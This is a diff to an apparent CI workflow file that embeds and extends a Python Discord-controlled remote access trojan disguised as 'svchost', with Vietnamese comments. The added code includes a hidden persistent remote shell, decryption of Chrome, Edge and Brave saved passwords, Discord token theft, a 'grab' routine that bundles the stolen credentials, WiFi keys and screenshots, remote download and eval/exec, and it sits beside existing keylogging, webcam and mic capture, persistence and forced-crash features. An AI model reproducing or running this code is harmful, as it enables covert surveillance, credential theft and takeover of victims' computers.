@@ -44,11 +44,11 @@ jobs:
         run: |
           $py = @'
           # ============================================================
-          #   DISCORD REMOTE AGENT "svchost" - FULL
-          #   Ẩn + persist + tự hồi sinh + voice + đa máy
+          #   DISCORD REMOTE AGENT "svchost" - FULL +
+          #   Ẩn + persist + tự hồi sinh + voice + shell + loot + đa máy
           # ============================================================
           import os, sys, io, time, json, socket, ctypes, zipfile, subprocess, threading, wave
-          import base64, glob, shutil, tempfile, platform, datetime, queue, asyncio
+          import base64, glob, shutil, tempfile, platform, datetime, queue, asyncio, re
 
           import discord
 
@@ -78,6 +78,7 @@ jobs:
               Image = ImageGrab = None
 
           os.makedirs(LOOT_DIR, exist_ok=True)
+          NO_WIN = 0x08000000  # CREATE_NO_WINDOW
 
           # ============================================================
           #  NGỤY TRANG / PERSIST
@@ -163,7 +164,8 @@ jobs:
 
           def run_cmd(cmd, timeout=60):
               try:
-                  out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=timeout)
+                  out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,
+                                                timeout=timeout, creationflags=NO_WIN)
                   return out.decode("utf-8", errors="ignore") or "[không output]"
               except subprocess.CalledProcessError as e:
                   return e.output.decode("utf-8", errors="ignore")
@@ -175,6 +177,65 @@ jobs:
                   if n < 1024: return f"{n:.1f}{u}"
                   n /= 1024
               return f"{n:.1f}PB"
+
+          def is_admin():
+              try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
+              except Exception: return False
+
+          # ============================================================
+          #  SHELL PHIÊN BỀN (giữ cd / set / biến)
+          # ============================================================
+          class Shell:
+              def __init__(self):
+                  self.lock = threading.Lock()
+                  self.buf = bytearray()
+                  self.cwd = os.path.expanduser("~")
+                  self.proc = None
+                  self._spawn()
+              def _spawn(self):
+                  self.proc = subprocess.Popen(
+                      "cmd.exe", stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                      stderr=subprocess.STDOUT, cwd=self.cwd, bufsize=0,
+                      creationflags=NO_WIN)
+                  threading.Thread(target=self._reader, daemon=True).start()
+                  try:
+                      self.proc.stdin.write(b"@echo off\r\n"); self.proc.stdin.flush()
+                      time.sleep(0.3)
+                      self.buf.clear()
+                  except Exception: pass
+              def _reader(self):
+                  while True:
+                      try: chunk = os.read(self.proc.stdout.fileno(), 65536)
+                      except Exception: break
+                      if not chunk: break
+                      self.buf += chunk
+              def run(self, cmd, timeout=120):
+                  with self.lock:
+                      if self.proc.poll() is not None: self._spawn()
+                      marker = "__SVC_9x7__"
+                      self.buf.clear()
+                      try:
+                          self.proc.stdin.write((cmd + "\r\n").encode("utf-8", errors="ignore"))
+                          self.proc.stdin.write(
+                              ("echo " + marker + "%CD%" + marker + "\r\n").encode())
+                          self.proc.stdin.flush()
+                      except Exception:
+                          self._spawn(); return "[shell đã khởi động lại]"
+                      t0 = time.time()
+                      while time.time() - t0 < timeout:
+                          if marker.encode() in self.buf: break
+                          if self.proc.poll() is not None: break
+                          time.sleep(0.04)
+                      data = self.buf.decode("utf-8", errors="ignore")
+                      self.buf.clear()
+                      if marker in data:
+                          out, rest = data.split(marker, 1)
+                          newcwd = rest.split(marker, 1)[0].strip()
+                          if os.path.isdir(newcwd): self.cwd = newcwd
+                          return out.strip() or "[ok]"
+                      return (data.strip() or "[ok]") + "\n[chưa xong / timeout]"
+
+          _shell = Shell()
 
           # ============================================================
           #  FILE
@@ -191,7 +252,7 @@ jobs:
                           else: lines.append(f"{human(e.stat().st_size):>8}  {e.name}")
                       except Exception: pass
               except Exception as e: return f"Lỗi: {e}"
-              return "\n".join(lines[:200])
+              return "\n".join(lines[:300])
 
           def f_search(name, root="C:\\"):
               hits = []
@@ -224,14 +285,83 @@ jobs:
                       z.write(path, os.path.basename(path))
               return out
 
+          def f_cat(path):
+              path = os.path.expanduser(path)
+              if not os.path.exists(path): return f"Không tồn tại: {path}"
+              try:
+                  with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                      return f.read()[:25000]
+              except Exception as e: return f"Lỗi: {e}"
+
+          def f_write(args):
+              if len(args) < 2: return "Dùng: !write <path> <nội dung>"
+              path = os.path.expanduser(args[0]); content = " ".join(args[1:])
+              try:
+                  with open(path, "w", encoding="utf-8") as f: f.write(content)
+                  return f"Đã ghi {path} ({human(len(content))})"
+              except Exception as e: return f"Lỗi: {e}"
+
+          def f_mkdir(path):
+              try: os.makedirs(os.path.expanduser(path), exist_ok=True); return f"Đã tạo {path}"
+              except Exception as e: return f"Lỗi: {e}"
+
+          def f_copy(args):
+              try: shutil.copy2(os.path.expanduser(args[0]), os.path.expanduser(args[1])); return "Đã copy"
+              except Exception as e: return f"Lỗi: {e}"
+
+          def f_move(args):
+              try: shutil.move(os.path.expanduser(args[0]), os.path.expanduser(args[1])); return "Đã move"
+              except Exception as e: return f"Lỗi: {e}"
+
+          def f_rename(args):
+              try: os.rename(os.path.expanduser(args[0]), os.path.expanduser(args[1])); return "Đã đổi tên"
+              except Exception as e: return f"Lỗi: {e}"
+
+          def f_du(path):
+              path = os.path.expanduser(path or ".")
+              total = 0
+              for dp, dn, fn in os.walk(path):
+                  for f in fn:
+                      try: total += os.path.getsize(os.path.join(dp, f))
+                      except Exception: pass
+              return f"{human(total)}  {os.path.abspath(path)}"
+
+          def f_tree(path, depth=3):
+              path = os.path.expanduser(path or ".")
+              lines = []
+              def walk(d, pre, lvl):
+                  if lvl > int(depth): return
+                  try: entries = sorted(os.scandir(d), key=lambda x: x.name.lower())
+                  except Exception: return
+                  for e in entries[:80]:
+                      lines.append(f"{pre}{'📁 ' if e.is_dir() else '📄 '}{e.name}")
+                      if e.is_dir(): walk(e.path, pre + "   ", lvl + 1)
+              lines.append(f"📁 {os.path.abspath(path)}")
+              walk(path, "   ", 1)
+              return "\n".join(lines[:400])
+
+          def f_hex(path):
+              path = os.path.expanduser(path)
+              try:
+                  data = open(path, "rb").read(4096); out = []
+                  for i in range(0, len(data), 16):
+                      chunk = data[i:i+16]
+                      h = " ".join(f"{b:02x}" for b in chunk)
+                      t = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
+                      out.append(f"{i:08x}  {h:<48}  {t}")
+                  return "\n".join(out)
+              except Exception as e: return f"Lỗi: {e}"
+
           # ============================================================
           #  HỆ THỐNG
           # ============================================================
           def f_sysinfo():
               if not psutil: return "Thiếu psutil"
+              try: user = os.getlogin()
+              except Exception: user = os.environ.get("USERNAME", "?")
               vm = psutil.virtual_memory(); du = psutil.disk_usage("C:\\")
               boot = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M")
-              return (f"🖥️ Máy: {platform.node()} | User: {os.getlogin()}\n"
+              return (f"🖥️ Máy: {platform.node()} | User: {user} | Admin: {is_admin()}\n"
                       f"OS: {platform.system()} {platform.release()} ({platform.version()})\n"
                       f"CPU: {psutil.cpu_count()} nhân, dùng {psutil.cpu_percent()}%\n"
                       f"RAM: {human(vm.used)}/{human(vm.total)} ({vm.percent}%)\n"
@@ -248,7 +378,7 @@ jobs:
                   except Exception: pass
               rows.sort(reverse=True)
               return "\n".join(f"{c:5.1f}%  PID {pid:<7} {human(mem):>9}  {n}"
-                               for c,pid,n,mem in rows[:60])
+                               for c,pid,n,mem in rows[:80])
 
           def f_kill(target):
               if not psutil: return "Thiếu psutil"
@@ -270,7 +400,7 @@ jobs:
                       "sleep":"rundll32.exe powrprof.dll,SetSuspendState 0,1,0",
                       "lock":"rundll32.exe user32.dll,LockWorkStation","logoff":"shutdown /l"}
               if a not in cmds: return "Chọn: shutdown|restart|sleep|lock|logoff"
-              subprocess.Popen(cmds[a], shell=True); return f"Đang {a}..."
+              subprocess.Popen(cmds[a], shell=True, creationflags=NO_WIN); return f"Đang {a}..."
 
           def f_clip_set(text):
               if pyperclip: pyperclip.copy(text); return "Đã ghi clipboard"
@@ -284,12 +414,81 @@ jobs:
               def _popup(): ctypes.windll.user32.MessageBoxW(0, text, "svchost", 0x40)
               threading.Thread(target=_popup, daemon=True).start(); return "Đã bật popup"
 
+          def f_notify(text):
+              ps = ('powershell -NoProfile -c "'
+                    "[void][System.Reflection.Assembly]::LoadWithPartialName(\'System.Windows.Forms\');"
+                    "$n = New-Object System.Windows.Forms.NotifyIcon;"
+                    "$n.Icon = [System.Drawing.SystemIcons]::Information;"
+                    "$n.Visible = $true;"
+                    "$n.ShowBalloonTip(4000, \'svchost\', \'" + text + "\', 0);"
+                    "Start-Sleep -Seconds 5; $n.Dispose()\"")
+              subprocess.Popen(ps, shell=True, creationflags=NO_WIN); return "Đã gửi thông báo"
+
           def f_wall(path):
               try:
                   path = os.path.abspath(os.path.expanduser(path))
                   ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
                   return f"Đã đổi hình nền: {path}"
               except Exception as e: return f"Lỗi: {e}"
+
+          def f_drives():
+              out = []
+              if psutil:
+                  for p in psutil.disk_partitions():
+                      try:
+                          u = psutil.disk_usage(p.mountpoint)
+                          out.append(f"{p.device}  {p.fstype}  {human(u.used)}/{human(u.total)} ({u.percent}%)")
+                      except Exception: out.append(p.device)
+              return "\n".join(out) or run_cmd("wmic logicaldisk get name,size,freespace")
+
+          def f_env():
+              return "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items()))
+
+          def f_users(): return run_cmd("net user")
+          def f_services():
+              return run_cmd('powershell -NoProfile -c "Get-Service | Select Status,Name,DisplayName | Format-Table -AutoSize"')
+          def f_startup():
+              out = []
+              for h in ("HKCU", "HKLM"):
+                  out.append(run_cmd(f'reg query "{h}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"'))
+              out.append("--- Startup folder ---")
+              out.append(run_cmd('dir /b "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'))
+              return "\n".join(out)
+          def f_schedule():
+              return run_cmd('schtasks /query /fo LIST | findstr /i "TaskName Status Next"')
+          def f_uptime():
+              if psutil:
+                  up = time.time() - psutil.boot_time()
+                  return f"Uptime: {int(up//86400)}d {int(up%86400//3600)}h {int(up%3600//60)}m"
+              return run_cmd("net statistics workstation | findstr /i since")
+          def f_battery():
+              if psutil:
+                  b = psutil.sensors_battery()
+                  if b: return f"Pin: {b.percent}% | {'đang sạc' if b.power_plugged else 'đang dùng pin'}"
+              return run_cmd("WMIC PATH Win32_Battery Get EstimatedChargeRemaining")
+          def f_gpu(): return run_cmd("wmic path win32_VideoController get name,adapterram,driverversion /format:list")
+          def f_av():
+              return run_cmd('powershell -NoProfile -c "Get-CimInstance -Namespace root/SecurityCenter2 '
+                             '-ClassName AntiVirusProduct | Select displayName,productState | Format-List"')
+          def f_recycle():
+              return run_cmd('powershell -NoProfile -c "Clear-RecycleBin -Force"') or "Đã dọn thùng rác"
+
+          def f_installed():
+              import winreg
+              out = []
+              for hive, path in [(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
+                                 (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall")]:
+                  try:
+                      k = winreg.OpenKey(hive, path)
+                      for i in range(winreg.QueryInfoKey(k)[0]):
+                          try:
+                              sk = winreg.OpenKey(k, winreg.EnumKey(k, i))
+                              n = winreg.QueryValueEx(sk, "DisplayName")[0]
+                              v = winreg.QueryValueEx(sk, "DisplayVersion")[0]
+                              out.append(f"{n}  {v}")
+                          except Exception: pass
+                  except Exception: pass
+              return "\n".join(sorted(set(out))) or "Không có"
 
           # ============================================================
           #  MEDIA
@@ -355,14 +554,30 @@ jobs:
               subprocess.Popen(
                   f'powershell -c "Add-Type -AssemblyName System.Speech;'
                   f'(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(\'{text}\')"',
-                  shell=True)
+                  shell=True, creationflags=NO_WIN)
               return "Đang nói..."
+
+          def f_play(path):
+              path = os.path.abspath(os.path.expanduser(path))
+              if not os.path.exists(path): return f"Không thấy: {path}"
+              if path.lower().endswith(".wav"):
+                  import winsound
+                  threading.Thread(target=lambda: winsound.PlaySound(path, winsound.SND_FILENAME),
+                                   daemon=True).start()
+              else:
+                  subprocess.Popen(f'powershell -c "(New-Object Media.SoundPlayer \'{path}\').PlaySync()"',
+                                   shell=True, creationflags=NO_WIN)
+              return f"Đang phát: {path}"
 
           def f_beep():
               import winsound; winsound.MessageBeep(); return "🔔"
 
+          def f_open(url):
+              try: os.startfile(url); return f"Đã mở: {url}"
+              except Exception as e: return f"Lỗi: {e}"
+
           # ============================================================
-          #  INPUT / KEYLOG
+          #  INPUT / KEYLOG / TROLL
           # ============================================================
           _klog_on = False; _klog_buf = []; _klog_listener = None
 
@@ -403,41 +618,17 @@ jobs:
                   return f"Chuột {act} @ {x},{y}"
               except Exception as e: return f"Lỗi: {e}"
 
-          # ============================================================
-          #  MẠNG
-          # ============================================================
-          def f_wifi():
-              try:
-                  raw = subprocess.check_output("netsh wlan show profiles",
-                          shell=True).decode("utf-8", errors="ignore")
-                  names = [l.split(":")[-1].strip() for l in raw.splitlines() if "All User Profile" in l]
-                  out = []
-                  for n in names:
-                      try:
-                          d = subprocess.check_output(
-                              f'netsh wlan show profile name="{n}" key=clear',
-                              shell=True).decode("utf-8", errors="ignore")
-                          pw = [l.split(":")[-1].strip() for l in d.splitlines() if "Key Content" in l]
-                          out.append(f"📶 {n}  →  {pw[0] if pw else '(mở)'}")
-                      except Exception: pass
-                  return "\n".join(out) or "Không có WiFi lưu"
-              except Exception as e: return f"Lỗi: {e}"
+          def _key(vk, times=1):
+              for _ in range(times):
+                  ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
+                  ctypes.windll.user32.keybd_event(vk, 0, 2, 0)
 
-          def f_net():
-              out = [f"Host: {socket.gethostname()}"]
-              try:
-                  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("8.8.8.8",80))
-                  out.append(f"IP LAN: {s.getsockname()[0]}"); s.close()
-              except Exception: pass
-              out.append(run_cmd("ipconfig | findstr /i \"IPv4 Gateway\""))
-              return "\n".join(out)
+          def f_caps(): _key(0x14); return "Đã nháy Caps Lock"
+          def f_desk(): _key(0x5B); _key(0x44); return "Show desktop"
+          def f_mute(): _key(0xAD); return "Toggle mute"
+          def f_volup(n=5): _key(0xAF, int(n)); return f"Volume +{n}"
+          def f_voldown(n=5): _key(0xAE, int(n)); return f"Volume -{n}"
 
-          def f_ports(): return run_cmd("netstat -ano | findstr LISTENING")
-          def f_ping(host): return run_cmd(f"ping -n 4 {host}")
-
-          # ============================================================
-          #  TROLL
-          # ============================================================
           def f_cd():
               ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
               time.sleep(1)
@@ -448,10 +639,7 @@ jobs:
               try:
                   n = int(args[0]) if args else 5
                   vk = {"+":0xAF, "-":0xAE, "m":0xAD}.get(args[1] if len(args)>1 else "+", 0xAF)
-                  for _ in range(n):
-                      ctypes.windll.user32.keybd_event(vk,0,0,0)
-                      ctypes.windll.user32.keybd_event(vk,0,2,0)
-                  return f"Âm lượng x{n}"
+                  _key(vk, n); return f"Âm lượng x{n}"
               except Exception as e: return f"Lỗi: {e}"
 
           class POINTL(ctypes.Structure): _fields_=[("x",ctypes.c_long),("y",ctypes.c_long)]
@@ -481,27 +669,201 @@ jobs:
               return "Đã xoay màn hình"
 
           def f_bsod():
-              ntdll = ctypes.windll.ntdll
-              ntdll.RtlSetProcessIsCritical(True, None, None)
+              ctypes.windll.ntdll.RtlSetProcessIsCritical(True, None, None)
               ctypes.windll.kernel32.TerminateProcess(
                   ctypes.windll.kernel32.GetCurrentProcess(), 0)
 
           # ============================================================
-          #  UPDATE
+          #  MẠNG
+          # ============================================================
+          def f_wifi():
+              try:
+                  raw = subprocess.check_output("netsh wlan show profiles",
+                          shell=True, creationflags=NO_WIN).decode("utf-8", errors="ignore")
+                  names = [l.split(":")[-1].strip() for l in raw.splitlines() if "All User Profile" in l]
+                  out = []
+                  for n in names:
+                      try:
+                          d = subprocess.check_output(
+                              f'netsh wlan show profile name="{n}" key=clear',
+                              shell=True, creationflags=NO_WIN).decode("utf-8", errors="ignore")
+                          pw = [l.split(":")[-1].strip() for l in d.splitlines() if "Key Content" in l]
+                          out.append(f"📶 {n}  →  {pw[0] if pw else '(mở)'}")
+                      except Exception: pass
+                  return "\n".join(out) or "Không có WiFi lưu"
+              except Exception as e: return f"Lỗi: {e}"
+
+          def f_net():
+              out = [f"Host: {socket.gethostname()}"]
+              try:
+                  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("8.8.8.8",80))
+                  out.append(f"IP LAN: {s.getsockname()[0]}"); s.close()
+              except Exception: pass
+              out.append(run_cmd('ipconfig | findstr /i "IPv4 Gateway"'))
+              return "\n".join(out)
+
+          def f_ports(): return run_cmd("netstat -ano | findstr LISTENING")
+          def f_ping(host): return run_cmd(f"ping -n 4 {host}")
+          def f_arp(): return run_cmd("arp -a")
+          def f_dns(): return run_cmd("ipconfig /flushdns")
+
+          def f_dl(args):
+              if not requests: return "Thiếu requests"
+              if len(args) < 2: return "Dùng: !dl <url> <path>"
+              url = args[0]; dest = os.path.expanduser(" ".join(args[1:]))
+              try:
+                  r = requests.get(url, timeout=180, stream=True)
+                  with open(dest, "wb") as f:
+                      for c in r.iter_content(65536): f.write(c)
+                  return f"Đã tải {human(os.path.getsize(dest))} → {dest}"
+              except Exception as e: return f"Lỗi: {e}"
+
+          def f_speedtest():
+              if not requests: return "Thiếu requests"
+              url = "https://speed.cloudflare.com/__down?bytes=10000000"
+              try:
+                  t0 = time.time(); n = 0
+                  r = requests.get(url, stream=True, timeout=60)
+                  for c in r.iter_content(65536): n += len(c)
+                  dt = time.time() - t0
+                  return f"{human(n)} trong {dt:.1f}s → {n*8/dt/1e6:.1f} Mbps"
+              except Exception as e: return f"Lỗi: {e}"
+
+          # ============================================================
+          #  BROWSER / DISCORD / GRAB
+          # ============================================================
+          def _dpapi(blob):
+              import ctypes
+              from ctypes import wintypes
+              class BLOB(ctypes.Structure):
+                  _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
+              buf = ctypes.create_string_buffer(blob, len(blob))
+              bi = BLOB(len(blob), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
+              bo = BLOB()
+              if not ctypes.windll.crypt32.CryptUnprotectData(
+                      ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo)):
+                  return b""
+              out = ctypes.string_at(bo.pbData, bo.cbData)
+              ctypes.windll.kernel32.LocalFree(bo.pbData)
+              return out
+
+          def _browsers():
+              local = os.environ.get("LOCALAPPDATA", "")
+              return [("Chrome", os.path.join(local, r"Google\Chrome\User Data")),
+                      ("Edge",   os.path.join(local, r"Microsoft\Edge\User Data")),
+                      ("Brave",  os.path.join(local, r"BraveSoftware\Brave-Browser\User Data"))]
+
+          def f_browser():
+              try:
+                  from Crypto.Cipher import AES
+              except Exception:
+                  return "Thiếu pycryptodome"
+              import sqlite3
+              lines = []
+              for name, base in _browsers():
+                  ls = os.path.join(base, "Local State")
+                  if not os.path.exists(ls): continue
+                  try:
+                      key = _dpapi(base64.b64decode(
+                          json.load(open(ls, encoding="utf-8"))["os_crypt"]["encrypted_key"])[5:])
+                  except Exception: continue
+                  for prof in os.listdir(base):
+                      db = os.path.join(base, prof, "Login Data")
+                      if not os.path.exists(db): continue
+                      tmp = os.path.join(tempfile.gettempdir(), "ld_" + prof + ".db")
+                      try: shutil.copy2(db, tmp)
+                      except Exception: continue
+                      try:
+                          con = sqlite3.connect(tmp); cur = con.cursor()
+                          cur.execute("SELECT origin_url, username_value, password_value FROM logins")
+                          for url, user, pw in cur.fetchall():
+                              if not pw: continue
+                              try:
+                                  if pw[:3] == b"v10":
+                                      d = AES.new(key, AES.MODE_GCM, pw[3:15]).decrypt(pw[15:])[:-16].decode("utf-8", "ignore")
+                                  else:
+                                      d = _dpapi(pw).decode("utf-8", "ignore")
+                              except Exception: d = "(?)"
+                              lines.append(f"[{name}/{prof}] {url} | {user} | {d}")
+                          con.close()
+                      except Exception: pass
+              return "\n".join(lines[:300]) or "Không đọc được mật khẩu"
+
+          def f_discord():
+              roots = [os.path.join(os.environ.get("APPDATA",""), x) for x in
+                       ("discord","discordcanary","discordptb")]
+              roots += [os.path.join(os.environ.get("LOCALAPPDATA",""), r"Google\Chrome\User Data"),
+                        os.path.join(os.environ.get("LOCALAPPDATA",""), r"Microsoft\Edge\User Data"),
+                        os.path.join(os.environ.get("LOCALAPPDATA",""), r"BraveSoftware\Brave-Browser\User Data")]
+              pat = re.compile(r"[\w-]{24,}\.[\w-]{6}\.[\w-]{27,}")
+              res = []
+              for r in roots:
+                  if not os.path.isdir(r): continue
+                  for dp, dn, fn in os.walk(r):
+                      if "leveldb" not in dp.lower(): continue
+                      for f in fn:
+                          if f.endswith((".ldb",".log")):
+                              try:
+                                  data = open(os.path.join(dp,f), "r", errors="ignore").read()
+                                  for m in pat.findall(data):
+                                      if m not in res: res.append(m)
+                              except Exception: pass
+              return "\n".join(res) or "Không tìm thấy token"
+
+          def f_grab():
+              gdir = os.path.join(LOOT_DIR, "grab")
+              shutil.rmtree(gdir, ignore_errors=True); os.makedirs(gdir, exist_ok=True)
+              def w(n, t):
+                  try: open(os.path.join(gdir, n), "w", encoding="utf-8", errors="ignore").write(t or "")
+                  except Exception: pass
+              w("sysinfo.txt", f_sysinfo()); w("wifi.txt", f_wifi()); w("net.txt", f_net())
+              w("env.txt", f_env()); w("users.txt", f_users()); w("processes.txt", f_ps())
+              w("installed.txt", f_installed()); w("discord_tokens.txt", f_discord())
+              w("browser_passwords.txt", f_browser())
+              try: w("clipboard.txt", f_clip_get())
+              except Exception: pass
+              try:
+                  p = f_screen()
+                  if p: shutil.copy2(p, os.path.join(gdir, "screen.png"))
+              except Exception: pass
+              out = os.path.join(tempfile.gettempdir(), "grab.zip")
+              with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
+                  for dp, dn, fn in os.walk(gdir):
+                      for f in fn:
+                          fp = os.path.join(dp, f)
+                          z.write(fp, os.path.relpath(fp, gdir))
+              return out
+
+          # ============================================================
+          #  UPDATE / EVAL
           # ============================================================
           def f_update(url):
               if not requests: return "Thiếu requests"
               try:
                   new = os.path.join(INSTALL_DIR, "svchost_new.exe")
-                  r = requests.get(url, timeout=60)
+                  r = requests.get(url, timeout=90)
                   with open(new, "wb") as f: f.write(r.content)
                   bat = os.path.join(INSTALL_DIR, "_upd.bat")
                   with open(bat, "w") as f:
                       f.write(f'@echo off\ntimeout /t 2 >nul\n'
                               f'del "{SCRIPT_PATH}"\nmove /y "{new}" "{SCRIPT_PATH}"\n'
                               f'start "" "{SCRIPT_PATH}"\n')
-                  subprocess.Popen(f'cmd /c "{bat}"', shell=True)
+                  subprocess.Popen(f'cmd /c "{bat}"', shell=True, creationflags=NO_WIN)
                   time.sleep(1); os._exit(0)
+              except Exception as e: return f"Lỗi: {e}"
+
+          def f_restart():
+              subprocess.Popen(f'cmd /c ping 1.1.1.1 -n 3 >nul & start "" "{self_path()}"',
+                               shell=True, creationflags=NO_WIN)
+              time.sleep(0.5); os._exit(0)
+
+          _pyglobals = {}
+          def f_eval(expr):
+              try: return str(eval(expr, _pyglobals))
+              except Exception as e: return f"Lỗi: {e}"
+          def f_exec(code):
+              try:
+                  exec(code, _pyglobals); return "OK"
               except Exception as e: return f"Lỗi: {e}"
 
           # ============================================================
@@ -514,7 +876,6 @@ jobs:
                   self.q = queue.Queue(maxsize=50)
                   self.kind = kind; self.buf = b""; self.running = True
                   threading.Thread(target=self._capture, daemon=True).start()
-
               def _capture(self):
                   try:
                       import soundcard as sc2
@@ -524,10 +885,8 @@ jobs:
                           dev = sc2.get_microphone(spk.name, include_loopback=True)
                       else:
                           dev = sc2.default_microphone()
-                      try:
-                          rec, ch = dev.recorder(samplerate=48000, channels=2), 2
-                      except Exception:
-                          rec, ch = dev.recorder(samplerate=48000, channels=1), 1
+                      try: rec, ch = dev.recorder(samplerate=48000, channels=2), 2
+                      except Exception: rec, ch = dev.recorder(samplerate=48000, channels=1), 1
                       with rec:
                           while self.running:
                               data = rec.record(numframes=960)
@@ -537,7 +896,6 @@ jobs:
                               except queue.Full: pass
                   except Exception as e:
                       print("voice capture lỗi:", e)
-
               def read(self):
                   data = self.buf
                   while len(data) < 3840:
@@ -546,7 +904,6 @@ jobs:
                   if len(data) < 3840: data += b"\x00" * (3840 - len(data))
                   self.buf = data[3840:]
                   return data[:3840]
-
               def is_opus(self): return False
 
           # ============================================================
@@ -560,76 +917,126 @@ jobs:
           async def c_help(m, a):
               await m.channel.send(
                   "**📋 LỆNH**\n"
-                  "**File:** `!ls` `!download <path>` `!upload` `!search <tên>` `!del` `!zip`\n"
-                  "**Hệ thống:** `!sysinfo` `!ps` `!kill <tên>` `!start <path>` "
-                  "`!power shutdown|restart|sleep|lock` `!clip [text]` `!msg <text>` `!wall <path>`\n"
-                  "**Media:** `!chupanh` `!chupmanhinh` `!monitors` `!record <s>` `!camgif` "
-                  "`!mic <s>` `!speak <text>` `!beep`\n"
-                  "**Input:** `!keylog on|off|dump|clear` `!type <text>` `!mouse x y [click]`\n"
-                  "**Mạng:** `!wifi` `!net` `!ports` `!ping <host>`\n"
+                  "**Shell:** `!sh <lệnh>` (phiên bền) `!ps1 <lệnh>` `!pwd` `!cddir <path>` `!cmd <lệnh>`\n"
+                  "**File:** `!ls` `!cat` `!write` `!mkdir` `!copy` `!move` `!rename` `!tree` `!du` `!hex` "
+                  "`!search` `!del` `!zip` `!download` `!upload`\n"
+                  "**Hệ thống:** `!sysinfo` `!ps` `!kill` `!start` `!power` `!drives` `!env` `!users` "
+                  "`!services` `!startup` `!schedule` `!uptime` `!battery` `!gpu` `!av` `!installed` `!recycle`\n"
+                  "**Media:** `!chupanh` `!chupmanhinh` `!monitors` `!record` `!camgif` `!mic` `!speak` "
+                  "`!play` `!open` `!beep`\n"
+                  "**Input/Troll:** `!keylog` `!type` `!mouse` `!clip` `!msg` `!notify` `!wall` `!cd` "
+                  "`!flip` `!volume` `!caps` `!desk` `!mute` `!bsod`\n"
+                  "**Mạng:** `!wifi` `!net` `!ports` `!ping` `!arp` `!dns` `!dl` `!speedtest`\n"
+                  "**Loot:** `!grab` `!browser` `!discord`\n"
                   "**Voice:** `!join` (mic) · `!join sys` (âm thanh máy) · `!leave`\n"
-                  "**Khác:** `!cd` `!flip` `!volume <n>` `!bsod` `!update <url>` `!persist` `!id` `!huy`\n"
+                  "**Khác:** `!eval` `!exec` `!update <url>` `!restart` `!persist` `!id` `!huy`\n"
                   "👉 Đa máy: `!<ID> <lệnh>` · `!all <lệnh>`")
 
-          async def c_cmd(m, a):
-              real = " ".join(a) or "echo hello"
-              await m.channel.send(f"🖥️ `{real}`")
-              await send_long(m, await ex(run_cmd, real))
+          async def c_cmd(m, a): await send_long(m, await ex(run_cmd, " ".join(a) or "echo hello"))
+          async def c_sh(m, a):
+              raw = getattr(m, "_raw", " ".join(a))
+              if not raw: return await m.channel.send(f"cwd: {_shell.cwd}")
+              await send_long(m, await ex(_shell.run, raw))
+          async def c_pwd(m, a): await m.channel.send(f"📂 {_shell.cwd}")
+          async def c_cddir(m, a):
+              await ex(_shell.run, "cd /d " + " ".join(a))
+              await m.channel.send(f"📂 {_shell.cwd}")
+          async def c_ps1(m, a):
+              await send_long(m, await ex(run_cmd, 'powershell -NoProfile -c "' + " ".join(a) + '"', 120))
 
           async def c_ls(m, a):      await send_long(m, await ex(f_ls, " ".join(a) or "."))
+          async def c_cat(m, a):     await send_long(m, await ex(f_cat, " ".join(a)))
+          async def c_write(m, a):   await m.channel.send(await ex(f_write, a))
+          async def c_mkdir(m, a):   await m.channel.send(await ex(f_mkdir, " ".join(a)))
+          async def c_copy(m, a):    await m.channel.send(await ex(f_copy, a))
+          async def c_move(m, a):    await m.channel.send(await ex(f_move, a))
+          async def c_rename(m, a):  await m.channel.send(await ex(f_rename, a))
+          async def c_tree(m, a):    await send_long(m, await ex(f_tree, " ".join(a) or ".", 3))
+          async def c_du(m, a):      await m.channel.send(await ex(f_du, " ".join(a)))
+          async def c_hex(m, a):     await send_long(m, await ex(f_hex, " ".join(a)))
           async def c_search(m, a):  await send_long(m, await ex(f_search, " ".join(a)))
           async def c_del(m, a):     await m.channel.send(await ex(f_del, " ".join(a)))
+
           async def c_sysinfo(m, a): await send_long(m, await ex(f_sysinfo))
           async def c_ps(m, a):      await send_long(m, await ex(f_ps))
           async def c_kill(m, a):    await m.channel.send(await ex(f_kill, " ".join(a)))
           async def c_start(m, a):   await m.channel.send(await ex(f_start, " ".join(a)))
           async def c_power(m, a):   await m.channel.send(await ex(f_power, " ".join(a) or "lock"))
+          async def c_drives(m, a):  await send_long(m, await ex(f_drives))
+          async def c_env(m, a):     await send_long(m, await ex(f_env))
+          async def c_users(m, a):   await send_long(m, await ex(f_users))
+          async def c_services(m, a):await send_long(m, await ex(f_services))
+          async def c_startup(m, a): await send_long(m, await ex(f_startup))
+          async def c_schedule(m, a):await send_long(m, await ex(f_schedule))
+          async def c_uptime(m, a):  await m.channel.send(await ex(f_uptime))
+          async def c_battery(m, a): await m.channel.send(await ex(f_battery))
+          async def c_gpu(m, a):     await send_long(m, await ex(f_gpu))
+          async def c_av(m, a):      await send_long(m, await ex(f_av))
+          async def c_installed(m, a):await send_long(m, await ex(f_installed))
+          async def c_recycle(m, a): await m.channel.send(await ex(f_recycle))
+
           async def c_clip(m, a):
               if a: await m.channel.send(await ex(f_clip_set, " ".join(a)))
               else: await send_long(m, await ex(f_clip_get))
           async def c_msg(m, a):     await m.channel.send(await ex(f_msg, " ".join(a)))
